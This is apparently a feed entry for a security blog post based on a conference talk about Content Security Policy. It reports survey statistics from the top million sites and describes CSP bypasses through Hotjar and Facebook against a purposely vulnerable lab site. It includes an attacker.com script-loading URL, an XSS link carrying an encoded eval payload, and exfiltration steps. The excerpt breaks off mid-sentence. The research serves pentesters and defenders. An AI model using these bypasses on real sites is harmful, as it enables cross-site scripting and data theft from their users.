with both the sequential and asynchronous approach. The blue bar is the sequential approach, which took 26 minutes, and the orange bar represents the asynchronous approach, which took 2:14 minutes.</p>\n\n\n\n<figure class=\"wp-block-image size-full\"><a href=\"https://sensepost.com/img/pages/blog/2023/dress-code-the-talk/image-20.png\"><img loading=\"lazy\" decoding=\"async\" width=\"845\" height=\"470\" src=\"https://sensepost.com/img/pages/blog/2023/dress-code-the-talk/image-20.png\" alt=\"\" class=\"wp-image-68468\"></a></figure>\n\n\n\n<p>This allowed me to reduce the time taken to scan the top 1 million sites form ~32 days to ~3 days. You can take a look at the <a href=\"https://github.com/sensepost/dresscode/blob/main/async_poll_headers.py\">asyncronous code here</a>.</p>\n\n\n\n<p>Good! Time goes down, stonks go up. </p>\n\n\n\n<figure class=\"wp-block-image size-full is-resized\"><a href=\"https://sensepost.com/img/pages/blog/2023/dress-code-the-talk/image-23.png\"><img loading=\"lazy\" decoding=\"async\" width=\"680\" height=\"510\" src=\"https://sensepost.com/img/pages/blog/2023/dress-code-the-talk/image-23.png\" alt=\"\" class=\"wp-image-68472\" style=\"width:457px;height:342px\"></a></figure>\n\n\n\n<p>In summary, the architecture of the solution would look like this: a jumpbox scanning the sites using aiohttp, managing the datasets with the pandas library, then storing the information in a MongoDB, and finally, tapping into this information through a Dashboard programmed with python <a href=\"https://dash.plotly.com/\">Dash and Plotly express</a>:</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><a href=\"https://sensepost.com/img/pages/blog/2023/dress-code-the-talk/image-24.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"567\" src=\"https://sensepost.com/img/pages/blog/2023/dress-code-the-talk/image-24-1024x567.png\" alt=\"\" class=\"wp-image-68474\"></a><figcaption class=\"wp-element-caption\">Architecture</figcaption></figure>\n\n\n\n<p>Away with the efficiency comparison now. Lets dig into the ingestion process of the data.</p>\n\n\n\n<ol>\n<li>Collect headers from the top 1 million sites chosen (Majestic million and Cisco Umbrella). </li>\n\n\n\n<li>Parse the CSP information from the headers.</li>\n\n\n\n<li>Asign the document a country (first by ccTLD, then by IP address geolocation or by <a href=\"https://www.domain.com/blog/what-is-whois-and-how-is-it-used/\">WHOIS</a> information)</li>\n\n\n\n<li>Spot weaknesses and potential bypasses (see <a href=\"#bypasses\">the first section</a>)</li>\n</ol>\n\n\n\n<h3 class=\"wp-block-heading\" id=\"dashboard-health\">Dashboard &#x2013; CSP Health Status</h3>\n\n\n\n<p>From the Dashboard we can obtain interesting information, such as the percentage of sites using CSP, which disappointingly does not reach to a 10%:</p>\n\n\n\n<figure class=\"wp-block-image size-full\"><a href=\"https://sensepost.com/img/pages/blog/2023/dress-code-the-talk/csp-widespread.png\"><img loading=\"lazy\" decoding=\"async\" width=\"977\" height=\"638\" src=\"https://sensepost.com/img/pages/blog/2023/dress-code-the-talk/csp-widespread.png\" alt=\"\" class=\"wp-image-70667\"></a><figcaption class=\"wp-element-caption\">Usage of Content-Security-Policy[-Report-Only] headers</figcaption></figure>\n\n\n\n<p>If we are to make a bit of self-criticism in the security industry, I would say that we are not doing our job. I would compare this situation to the commercial where 9 out of 10 dentists recommend you to brush your teeth, but its the opposite: 9 out of 10 dentists are not brushing their teeth or encouraging their clients to do so:</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><a href=\"https://sensepost.com/img/pages/blog/2023/dress-code-the-talk/image-27.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"383\" src=\"https://sensepost.com/img/pages/blog/2023/dress-code-the-talk/image-27-1024x383.png\" alt=\"\" class=\"wp-image-68484\"></a></figure>\n\n\n\n<p>Jokes aside, luckily, there&#x2019;s a positive side of it. The most popular sites are implementing CSP more frequently than the less popular sites, as it can be observed in the following chart:</p>\n\n\n\n<figure class=\"wp-block-image size-large is-resized\"><a href=\"https://sensepost.com/img/pages/blog/2023/dress-code-the-talk/top-comparative-csp.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"554\" src=\"https://sensepost.com/img/pages/blog/2023/dress-code-the-talk/top-comparative-csp-1024x554.png\" alt=\"\" class=\"wp-image-70594\" style=\"aspect-ratio:1.848375451263538;width:610px;height:auto\"></a><figcaption class=\"wp-element-caption\">Percentage of CSP usage across the top 1.000, 10.000 and, 100.000 sites sorted by popularity.</figcaption></figure>\n\n\n\n<p>The previous chart shows the percentage of CSP usage if we sort the sites by popularity and then take the top 1000, top 10000, and top 100000.</p>\n\n\n\n<p>We can also explore other information from the dashboard, such as the most used CSP directives:</p>\n\n\n\n<figure class=\"wp-block-image size-large is-resized\"><a href=\"https://sensepost.com/img/pages/blog/2023/dress-code-the-talk/csp-directives-freq.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"499\" src=\"https://sensepost.com/img/pages/blog/2023/dress-code-the-talk/csp-directives-freq-1024x499.png\" alt=\"\" class=\"wp-image-70595\" style=\"aspect-ratio:2.0521042084168335;width:610px;height:auto\"></a><figcaption class=\"wp-element-caption\">Most frequent CSP directives</figcaption></figure>\n\n\n\n<p>We can observe how the most popular of this list are &#x201C;<a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/upgrade-insecure-requests\">upgrade-insecure-requests</a>&#x201D; and &#x201C;<a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors\">frame-ancestors</a>&#x201C;, followed by many other *-src directives. This is understandable from the point of view of a website administrator; the less complicated directives to setup are those two, you don&#x2019;t need to allowlist anything or to maintain the allowlist, as &#x201C;upgrade-insecure-requests&#x201D; is used by itself, without any other value, and the immense majority of &#x201C;frame-ancestors&#x201D; values are configured with &#x201C;self&#x201D; or &#x201C;none&#x201D;.</p>\n\n\n\n<p>The five least frequently configured directives (and the CSP level where those directives are available) are: </p>\n\n\n\n<ul>\n<li><a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/object-src\">object-src</a> (L1)</li>\n\n\n\n<li><a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/media-src\">media-src</a> (L1)</li>\n\n\n\n<li><a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/worker-src\">worker-src</a> (L3)</li>\n\n\n\n<li><a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/base-uri\">base-uri</a> (L2)</li>\n\n\n\n<li><a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-uri\">report-uri</a> (L1 &#x2013; Deprecated in favor of <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-to\">report-to</a>)</li>\n</ul>\n\n\n\n<p>Clearly, those are not used enough despite the positive impact they can have on the security of your website. Probably due to the lack of understanding what these directives are protecting us against (more on that later).</p>\n\n\n\n<p>In the dashboard, we can take a look to the specific values configured for each CSP directive. Due to its importance, we will use &#x201C;<a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src\">script-src</a>&#x201D; as an example for this:</p>\n\n\n\n<figure class=\"wp-block-image size-large is-resized\"><a href=\"https://sensepost.com/img/pages/blog/2023/dress-code-the-talk/script-src.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"499\" src=\"https://sensepost.com/img/pages/blog/2023/dress-code-the-talk/script-src-1024x499.png\" alt=\"\" class=\"wp-image-70596\" style=\"aspect-ratio:2.0521042084168335;width:610px;height:auto\"></a><figcaption class=\"wp-element-caption\">Most frequent sources of the directive &#x2018;script-src&#x2019; </figcaption></figure>\n\n\n\n<p>We can observe that the most frequent directive values used are &#x201C;<a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/Sources#unsafe-inline\">unsafe-inline</a>&#x201D; and &#x201C;<a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/Sources#unsafe-eval\">unsafe-eval</a>&#x201C;. Looking from the percentage perspective:</p>\n\n\n\n<ul>\n<li>Presence of &#x201C;unsafe-inline&#x201D;: \n<ul>\n<li>Relative to sites with CSP headers: 21,898/124,098 = <strong>17%</strong></li>\n\n\n\n<li>Relative to sites defining a &#x201C;script-src&#x201D;: 21,898/24,793 = <strong>88%</strong></li>\n</ul>\n</li>\n\n\n\n<li>Presence of &#x201C;unsafe-eval&#x201D;:\n<ul>\n<li>Relative to sites with CSP headers: 19,931/124,098 = <strong>16%</strong></li>\n\n\n\n<li>Relative to sites defining a &#x201C;script-src&#x201D;: 19,931/24,793 = <strong>80%</strong></li>\n</ul>\n</li>\n</ul>\n\n\n\n<p>If we come back to the previous dentist analogy, not only is there one single dentist out of ten that brushes their teeth (implements CSP and defines a &#x201C;script-src&#x201D;), but rather that dentist brushes their teeth with sugar 6 days per week:</p>\n\n\n\n<figure class=\"wp-block-image size-full is-resized\"><a href=\"https://sensepost.com/img/pages/blog/2023/dress-code-the-talk/unsafe-inline-toothpaste.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"1024\" src=\"https://sensepost.com/img/pages/blog/2023/dress-code-the-talk/unsafe-inline-toothpaste.png\" alt=\"\" class=\"wp-image-70599\" style=\"aspect-ratio:1;width:415px;height:auto\"></a><figcaption class=\"wp-element-caption\">Try the new &#x201C;unsafe-inline&#x201D; toothpaste. It taste good, but serves for nothing</figcaption></figure>\n\n\n\n<p>Moving on to another topic in the Dashboard. I tried to count the average number of weaknesses per country, just for a bit of fun:</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><a href=\"https://sensepost.com/img/pages/blog/2023/dress-code-the-talk/image-28.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"463\" src=\"https://sensepost.com/img/pages/blog/2023/dress-code-the-talk/image-28-1024x463.png\" alt=\"\" class=\"wp-image-68485\"></a><figcaption class=\"wp-element-caption\">Average number of vulnerabilities per country.</figcaption></figure>\n\n\n\n<p>That intense red colour corresponds to an average count of eight weaknesses per country. No clear winner or medals for anyone here, sorry. </p>\n\n\n\n<p>Now lets talk a bit about the weaknesses, we can take a look at the most frequent ones detected:</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><a href=\"https://sensepost.com/img/pages/blog/2023/dress-code-the-talk/freq-weaknesses.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"653\" src=\"https://sensepost.com/img/pages/blog/2023/dress-code-the-talk/freq-weaknesses-1024x653.png\" alt=\"\" class=\"wp-image-70600\"></a><figcaption class=\"wp-element-caption\">Most frequent CSP weaknesses</figcaption></figure>\n\n\n\n<p>Topping the list we have the lack of &#x201C;<a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-to\">report-to</a>&#x201D; directives, with 116,991 times this weakness was detected. Keeping in mind that the number of sites with CSP headers is 124,098, this makes this weakness to be present in<strong> 94%</strong> of the sites with CSP headers. This indicates that most of the sites implementing CSP are currently not actively monitoring potential attacks in real time with this directive (95 of these sites, a 0.08%, were using the deprecated &#x201C;<a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-uri\">report-uri</a>&#x201D; directive instead).</p>\n\n\n\n<p>It is also very interesting to see that the most updated directive &#x201C;report-to&#x201D;, does not even appear in the list of the 18 most used directives, but its old and its deprecated cousin &#x201C;<a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-uri\">report-uri</a>&#x201D; does appear. </p>\n\n\n\n<p>This might be due to the problem brought to my attention during my Defcon 31 AppSec talk, where <a href=\"https://twitter.com/naugtur\">naugtur</a> let me know that enabling this directive could potentially lead to a high volume of traffic generated. This could potentially produce a DDoS scenario. Imagine what would happen when a highly-popular site forgets to allowlist their Google Analytics domain on their CSP, as described by <a href=\"https://twitter.com/Scott_Helme\">Scott Helme </a><a href=\"https://scotthelme.co.uk/just-how-much-traffic-can-you-generate-using-csp/\">here</a>. A way to prevent this scenario would be to use third-party solutions, such as <a href=\"https://developers.cloudflare.com/support/network/understanding-network-error-logging/\">Cloudflare</a>, <a href=\"https://report-uri.com/\">report-uri.io</a>, which externalise the volumetric problem, or implement your own report-to endpoint having this in mind (one example <a href=\"https://github.com/naugtur/csp-report-lite\">csp-report-lite</a>). </p>\n\n\n\n<p>Another possible reason is that &#x201C;report-to&#x201D; directive is not yet supported by all major browsers. Specifically, Firefox and Safari do not support it yet, whereas &#x201C;report-uri&#x201D; is supported by all major browsers:</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><a href=\"https://sensepost.com/img/pages/blog/2023/dress-code-the-talk/image-103.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"334\" src=\"https://sensepost.com/img/pages/blog/2023/dress-code-the-talk/image-103-1024x334.png\" alt=\"\" class=\"wp-image-69323\"></a><figcaption class=\"wp-element-caption\">Browser compatibility of report-to directive as of August 2023</figcaption></figure>\n\n\n\n<p>Following on in that list is the &#x201C;<a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/base-uri\">base-uri</a>&#x201C;, which is not defined in 116,794 of the sites. This is another shocking <strong>94%</strong> of the sites defining CSP but not using that feature.</p>\n\n\n\n<p>This might be due to the lack of clear understanding of what is this directive protecting you against. In this case, against injections changing the &lt;<a href=\"https://developer.mozilla.org/en-US/docs/Web/HTML/Element/base\">base</a>&gt; HTML tag to arbitrary attacker&#x2019;s domains. One good example of such attacks is <a href=\"https://hackerone.com/reports/1481207\">this Gitlab vulnerability </a>disclosed in HackerOne in 2022 (or <a href=\"https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass#missing-base-uri\">here</a> and <a href=\"https://security.stackexchange.com/a/190836\">here</a>).</p>\n\n\n\n<p>So, remember to make a wish if you come across a CSP with those two directives:</p>\n\n\n\n<figure class=\"wp-block-image size-full is-resized\"><a href=\"https://sensepost.com/img/pages/blog/2023/dress-code-the-talk/image-47.png\"><img loading=\"lazy\" decoding=\"async\" width=\"856\" height=\"867\" src=\"https://sensepost.com/img/pages/blog/2023/dress-code-the-talk/image-47.png\" alt=\"\" class=\"wp-image-68822\" style=\"width:610px;height:617px\"></a><figcaption class=\"wp-element-caption\">Amazed man, contemplating a CSP with report-to and base-uri directives (1701 sites overall)</figcaption></figure>\n\n\n\n<p>Let&#x2019;s focus our attention now to the less frequent weaknesses detected:</p>\n\n\n\n<figure class=\"wp-block-image size-full\"><a href=\"https://sensepost.com/img/pages/blog/2023/dress-code-the-talk/image-21.png\"><img loading=\"lazy\" decoding=\"async\" width=\"755\" height=\"372\" src=\"https://sensepost.com/img/pages/blog/2023/dress-code-the-talk/image-21.png\" alt=\"\" class=\"wp-image-70601\"></a><figcaption class=\"wp-element-caption\">Less frequent weaknesses</figcaption></figure>\n\n\n\n<p>We will look at <strong>&#x201C;Third Party Abuse&#x201D;</strong>. </p>\n\n\n\n<p>It is found in 11,349 sites, <strong>which is a ~9%</strong> of the sites implementing CSP. This means, that 9% of the sites contain a weakness that potentially can allow an attacker to bypass the policy by abusing the third-party trust. </p>\n\n\n\n<p>Regarding the last item of the list: <strong>&#x201C;Lenient Scheme</strong>&#x201C;. We find this weakness present in 9,267 sites, which is ~7% of the sites defining CSP. That is, the sites defining a CSP that allows a protocol handler such as &#x201C;https:&#x201D; or &#x201C;http:&#x201D; within a directive. This means that all resources loaded from a source coming from an &#x201C;https&#x201D; channel would be happily allowed. Depending on the directive this source is located in, the impact would be different (e.g. for <em>script-src &#x2018;https:&#x2019;</em> all scripts coming from an https will be allowed to be executed within the page context. For <em>connect-src &#x2018;https:&#x2019;</em>, all outbound connections to an https destination will be allowed).</p>\n\n\n\n<p>These may look like small percentages, but think about it as almost 1 in every 10 sites that have defined a CSP and expect to have protection against XSS and similar injections, can be bypassed by abusing one of their third-party domains allowed in the policy or by providing a resource coming from an &#x201C;https:&#x201D; source. This is a lot of sites that pile onto the ~90% of total sites that do not define CSP and the ~17% of sites defining CSP but allowing &#x201C;unsafe-inline&#x201D; and &#x201C;unsafe-eval&#x201D;.</p>\n\n\n\n<p>Finally, there is a section in the dashboard where the specific weaknesses can be observed listed in a table form. Some of the weakness that you can query are:</p>\n\n\n\n<ul>\n<li>Third Party Abuse</li>\n\n\n\n<li>Orphan Domains</li>\n\n\n\n<li>Unsafe Eval</li>\n\n\n\n<li>Unsafe Inline</li>\n\n\n\n<li>No CSP Defined</li>\n\n\n\n<li>Only CSP-Report-Only Defined</li>\n\n\n\n<li>etc.</li>\n</ul>\n\n\n\n<p>One weakness of that list that we have not yet talked about is the &#x201C;Orphan Domains&#x201D;. In this case, the CSP defined a directive allowing a particular domain as a source, such as <em>script-src subdomain.mydomain.com</em>. In the case that mydomain.com is potentially not registered (i.e. we get an <a href=\"https://www.dnsknowledge.com/whatis/nxdomain-non-existent-domain-2/\">NXDOMAIN</a> response from the DNS and <a href=\"https://whois.domaintools.com/\">Whois</a> do not return any results for this domain), we can consider the CSP is bypasseable: it only requires you to register &#x201C;mydomain.com&#x201D; and now you can execute script on the target domain.</p>\n\n\n\n<p>The dashboard can show us the domains affected by this in the &#x201C;Weakness&#x201D; section:</p>\n\n\n\n<figure class=\"wp-block-image size-large is-resized\"><a href=\"https://sensepost.com/img/pages/blog/2023/dress-code-the-talk/weaknesses-orphans-abuse.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"483\" src=\"https://sensepost.com/img/pages/blog/2023/dress-code-the-talk/weaknesses-orphans-abuse-1024x483.png\" alt=\"\" class=\"wp-image-70602\" style=\"aspect-ratio:2.12008281573499;width:611px;height:auto\"></a><figcaption class=\"wp-element-caption\">List of orphan domains detected</figcaption></figure>\n\n\n\n<h2 class=\"wp-block-heading\" id=\"conclusions\">Conclusions</h2>\n\n\n\n<p>We have looked at the current status of CSP in Internet in the <a href=\"#status\">second section</a>.</p>\n\n\n\n<p>~17% of sites had the &#x201C;unsafe-inline&#x201D; value in their CSP and ~16% had the &#x201C;unsafe-eval&#x201D; value. </p>\n\n\n\n<p>Other unsafe settings, such as having orphan domains allowed in their policy or lenient handlers, allowing any source or connect destination as long as it conformed to the http: or https: schemes, were also found.</p>\n\n\n\n<p>It is undeniable that CSP brings effective protection to many sites on the Internet and the standard is still alive and well, with the <a href=\"https://www.w3.org/TR/CSP3/\">Level 3</a> of the standard currently in Working Draft. Which is good news, as it will bring more control and granularity over what content can be executed on the sites.</p>\n\n\n\n<p>But, sadly, when we look at the usage level, the current status of CSP is not the best across the Internet.</p>\n\n\n\n<p>We have been living with CSP for a long time (the first level of the policy was approved in 2012, almost 11 years ago), and we are not implementing it broadly. It barely reaches a 30% presence in the top 1000 sites of Internet, but when we increase the scope of the study to a larger set of sites, the percentage drops to a mere 10%.</p>\n\n\n\n<p>I&#x2019;m not advocating for 100% use of CSP, as there will be static sites with a reduced attack surface where the benefit of implementing it would be minimal when compared to the risk of the page being exposed. But a 10% presence of this useful security feature seems to be a really low number from all perspectives.</p>\n\n\n\n<p>In the <a href=\"#bypasses\">first section</a>, we looked at six new vectors to bypass CSP and two that I have found on HackerOne reports, but were not so well-known, as I could not find blog posts or challenges explaining them in detail.</p>\n\n\n\n<p>Approximately 9% of the sites defining a CSP contained one of the eight instances of &#x201C;Third-Party Abuse&#x201D; described here.</p>\n\n\n\n<p>This indicates that 1 in every 11 sites can potentially have their CSP bypassed due to the blind trust in third-parties.</p>\n\n\n\n<p>This, in conjunction with the previous unsafe settings described before, makes me think that despite the good mechanism that CSP is, its complexity and the effort required for its maintenance is making people not implement it.</p>\n\n\n\n<p>To counteract this, the security community and developers need to be clear about the benefits of implementing a CSP and advocate for its safe implementation. For that I have some recommendations.</p>\n\n\n\n<h2 class=\"wp-block-heading\">Recommendations</h2>\n\n\n\n<ol>\n<li><strong>Implement CSP</strong>. Despite all the bypasses explained here, it does not mean it is not worth it. It can be an excellent tool to deter attackers and reduce the attack surface your clients and users are exposed to when navigating your web site.</li>\n\n\n\n<li>Use Subresource Integrity (<mark style=\"background-color:rgba(0, 0, 0, 0)\" class=\"has-inline-color has-accent-color\">SRI</mark>) in conjunction with CSP.</li>\n\n\n\n<li>When possible, try not to use the &#x201C;<mark style=\"background-color:rgba(0, 0, 0, 0)\" class=\"has-inline-color has-accent-color\">unsafe-inline</mark>&#x201D; and &#x201C;<mark style=\"background-color:rgba(0, 0, 0, 0)\" class=\"has-inline-color has-accent-color\">unsafe-eval</mark>&#x201D; values. Migrate to strict policies with &#x201C;<a href=\"https://content-security-policy.com/nonce/\">nonce</a>&#x201D; and &#x201C;<a href=\"https://content-security-policy.com/hash/\">hash</a>&#x201D; directives.</li>\n\n\n\n<li>Use &#x201C;<a href=\"https://content-security-policy.com/strict-dynamic/\">strict-dynamic</a>&#x201D; to reduce operational load if that helps your company adopting strict Content Security Policies, but be aware that it gives allowed scripts the capability to include additional scripts.</li>\n\n\n\n<li>Reduce allowed third-party domains in your CSP to a minimum. Instead, host the libraries on your own domain where possible.</li>\n\n\n\n<li>If third-party domains are required in your CSP, do not add them with wildcards (e.g. *.amazonaws.com).</li>\n\n\n\n<li>If you have enough bandwidth and capabilities, use <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-to\">report-to</a> with <a href=\"https://csplite.com/csp103/\">report-sample</a> to observe in real time what is happening on your user&#x2019;s browsers, including potential attacks to them, via your web site.</li>\n\n\n\n<li>Consider using commercial solutions to monitor client-side JavaScript (hint: Search for &#x201C;client-side protection javascript formjacking&#x201D; in Google).</li>\n</ol>\n",
      "content:encodedSnippet": "TL;DR \nThis post is a summary of the contents of my talk in Defcon 31 AppSec Village last August 2023, and part of what I will explain in Canada at the SecTor conference on the 24th of October 2023 at 4:00 PM.\nThere are two (big) blocks in this post. Sorry for the length <(_ _)>:\nThe first part is about the not so well-known CSP bypasses that I found during this research. These can be of use in your next pentest, bug bounty, etc. Have a look at the 8 third-party domains that can be abused to bypass a strict policy to execute that sweet Cross-Site Scripting (XSS) or clickjacking proof of concept that was initially being blocked.\nThe second part takes a step back and delves into the process of getting Content-Securiy-Policy (CSP) data from top 1 million sites and the conclusions I draw from it. After reading this part you will get a sense of how widespread and well-implemented CSP is across the Internet. You will also learn the common pitfalls people fall into when implementing the policy. The tool I wrote to scan and collect this information and review the results can be found in https://github.com/sensepost/dresscode \nIndex\nContext\nBypasses\n\nLab Environment\nHotjar\nFacebook\nJSDelivr\nAmazon AWS\nCloudfront, Azure, Heroku, Firebase\nCSP Health Status\n\nThe Architecture\nDashboard – CSP Health Status\nConclusions\nContext\nLast year I was working on a web application assessment, one of these assessments that are repeated every year in which the analyst has to face a hardened application. Therefore, every year, the report gets smaller and smaller when we look at the number of vulnerabilities. \nBy reading the previous year’s assessment report I spotted a nice stored XSS. When I went to replicate it, I found a relatively stringent Content Security Policy (CSP), which contained the directive “script-src” allowing only “nonced” scripts. This policy prevented me from exploiting the same stored XSS. I also found many other XSS vectors within the page, but all of them were prevented by the CSP policy. I was sad.\nAfter recovering from the down, I thought I should find a way to bypass their CSP. Long story short, I found a way by injecting my own JavaScript code into a legitimate eval function used within an allowed script (one that had the adequate nonce). In addition to that I was able to exploit other reflected XSS vectors to carry out a UI Redressing attack to mimic a login panel and exfiltrate harvested credentials to www.google-analytics.com.\nFrom that moment I became obsessed with finding new ways to bypass CSP that were not so well documented or known out there. It is not my intention to explain the two previous vulnerabilities here, but instead to show the results of the subsequent research on CSP. \nThe outcome of that research was twofold:\nTo find new ways to bypass CSP which I can add to my toolbox for future assessments.\nTo obtain a better view of the health status of CSP across the Internet.\nSo, lets dive into each topic separately, let’s start with the more practical section, the bypasses:\n1 – Bypasses\nYou will be able to see the current health status of CSP accross Internet in the section #2, but for the practical folks, here are the bypasses I found during the research. \nDisclaimer: I found a lot of information out there to bypass CSP by using JSON with padding (JSONP) and loading outdated AngularJS libraries (e.g. here, here and here), but I wanted to explore new ways to bypass the policies.\n\n\n\n\nI found six new third-parties to abuse to bypass CSP controls and two additional ones that were being exploited in bug bounty programs and publicly talked about, but not very well known. \nRegarding the six new vectors, I was not able to easily find public information describing how to use them to bypass CSP. Nevertheless, I think the eight of them deserve to be more popularised, so as a pentester, you can use them in your future assessments or bug bounties, and as a defender or developer, you can avoid them when defining your site’s CSP.\nHere’s the list of third parties that I found you can easily abuse when you find them in a CSP, some of them will be useful to exfiltrate data from the target site when found in directives such as “connect-src“, and some others to execute code when found in directives such as “script-src“:\n\n#EntityAllowed DomainCapabilitiesPublicly DocumentedNumber of Sites\n1Facebookwww.facebook.com,\n*.facebook.comExfilNo7310\n2Hotjar*.hotjar.com, \nask.hotjar.ioExfilNo2824\n3Jsdelivr*.jsdelivr.com, \ncdn.jsdelivr.netExecYes2208\n4Amazon CloudFront*.cloudfront.netExfil, ExecNo1441\n5Amazon AWS*.amazonaws.comExfil, ExecNo860\n6Azure Websites*.azurewebsites.net, \n*.azurestaticapps.netExfil, ExecNo90\n7Salesforce Heroku*.herokuapp.comExfil, ExecNo25\n8Google Firebase*.firebaseapp.comExfil, ExecYes19\n\nEight third party sites that can be used to bypass CSP\n\n\n\nIn the last column, you can see the number of sites that I found within the top 1 million where the “Allowed Domain” was present in their CSP. I have ignored www.google-analytics.com on purpose here, as we already had a lot of information out there to bypass CSP using Google Analytics (e.g. here and here) and I wanted to explore new vectors.\nPlease, do not take this as a comprehensive list of third-party domains that can be abused to bypass CSP, there might be others out there that I haven’t tested, therefore, don’t consider your CSP 100% secure if you don’t have these domains in your CSP. Always be cautions about what third party domains you trust within your CSP.\nLab Environment\nTo demonstrate the bypasses, I could have used any site found on my database, but I prefer not to go to jail just for some dummy demos, so I created a lab to demonstrate potential impact of the bypasses. The lab is a site, called Keyfc, where you can login and access a private page:\n\n\n\n\nThe private page will have the secret ingredient of the Keyfc recipe:\n\n\n\n\nIt also has a section to change your profile data, such as email, password or security questions and answers:\n\n\n\n\nI added two vulnerabilities to this page. The first one (vulnerability #1) is present in the file secret.php:\n\n\n\n\nYou can see that whatever you pass to the parameter “msg” will be injected within the allowed script. So, if you visit the following URL, you will get the following HTML code in response:\n\n\n\n\nThe second vulnerability (vulnerability #2) will be found in the same page “secret.php” and it will just include in the DOM a new script with its source pointing to the URL passed through the parameter “source”:\n\n\n\n\nSo, if we try to load a script controlled by an attacker by visiting the following URL:\nhttps://<site>/secret.php?source=https://attacker.com/exec.js\nThe script “exec.js” hosted in the attacker’s controlled domain would be executed. Of course, if the CSP has an allowlist within the “script-src” and the domain “attacker.com” is not there, the script will never be executed and we would get the following error in the console of our browser/agent:\nRefused to load the script 'https://attacker.com/exec.js' because it violates the following Content Security Policy directive: \"script-src [...]\". Note that 'script-src-elem' was not explicitly set, so 'script-src' is used as a fallback.\nSo, let’s find ways to bypass this restriction.\nProof of Concepts\nThe following sections will explain the process of bypassing CSP through third party abuse. \nAbuse #1 – Hotjar\nThis one allows an attacker to exfiltrate data, pretty much as we would do with the classical www.google-analytics.com exfiltration. An example CSP vulnerable to this would be the following:\ndefault-src 'self' ask.hotjar.io *.hotjar.com;?\nscript-src 'nonce-zM1mRhUyMJ13LFoja7kkF2pH' *.hotjar.com;\n[...]\nFor exfiltration purposes, instead of the “default-src”, we could work with a CSP that specified “connect-src” directive as well.\nAs an attacker, if we wanted to exfiltrate the security question and answer of a target user, we would not be able to exfiltrate to a random domain, so we would need to use Hotjar for that purpose. For that, we follow these general steps (have in mind this is just one example, but there could be many other ways to exfiltrate to Hotjar):\nOpen an account in Hotjar\nCreate a poll to insert in the attacker’s controlled site\nSniff your HTTP traffic and answer the poll\nMimic that “poll answer” in the victim-side\nObtain the “poll answer” in your attacker’s hotjar dashboard.\nThis is the code to exfiltrate to Hotjar that we need to execute on the victim’s agent:\n\n\n\n\nIf we encode the previous PoC to Base64 and take advantage of the vulnerability #1 (XSS) present in the page “secret.php” of the target page, we would end up with a link similar to this one:\nhttps://hotjar.keyfc.xyz/secret.php?msg=hello%22;eval(atob(%22ZmV0Y2[...]bGUucGIGk7Cn0pOwo%3d%22));//\nIf we make the victim click on this link or a shortened version of it (via bit.ly or any other URL shortener service) we will have the security question and answer exfiltrated to our Hotjar dashboard:\nSecurity question and answer exfiltrated to the attacker’s Hotjar account\n\n\n\nAbuse #2 – Facebook\nThis one allows an attacker to exfiltrate data to a Facebook developer dashboard. I found more than 7K sites in my DB that allowed “www.facebook.com” or “*.facebook.com” in the CSP directive. \nTo put this finding in perspective, the “golden standard” to exfiltrate data bypassing CSP could be considered “Google Analytics“, for which, there are a lot of blog posts and articles describing how to do it (e.g. here and here). For this case, I found 6K sites in my DB allowing “google-analytics.com” in their CSP. Despite the similar prevalence of both technologies, it is interesting how exfiltrating data with Facebook is not very well known and, up to my knowledge, no public blog posts describing this can be found on the Internet.\nAn example CSP vulnerable to this would be the following:\ndefault-src 'self' www.facebook.com;\nscript-src 'nonce-3FahAWXnLOYTy8KNO3V6Fsmd' *.facebook.net;\n[...]\nIn this case, if an attacker wanted to exfiltrate the secret ingredient from the target page, the general process would be the following (heads-up, this is not a detailed step by step):\nCreate a Facebook Developer account here.\nCreate a new “Facebook Login” app and select “Website”.\nGo to “Settings -> Basic” and get your “App ID”\nIn the target site you want to exfiltrate data from, you can exfiltrate data by directly using the Facebook SDK gadget “fbq” through a “customEvent” and the data payload.\nGo to your App “Event Manager” and select the application you created (note the event manager could be found in an URL similar to this: https://www.facebook.com/events_manager2/list/pixel/[app-id]/test_events \nSelect the tab “Test Events” to see the events being sent out by “your” web site.\nThis is the code we want to execute on the victim’s browser:\n\n\n\n\nThe first line would initialise the Facebook tracking pixel to point to the attacker’s controlled account. The second line would exfiltrate the secret ingredient as a custom event generated in the page.\nIf, by any way, we manage 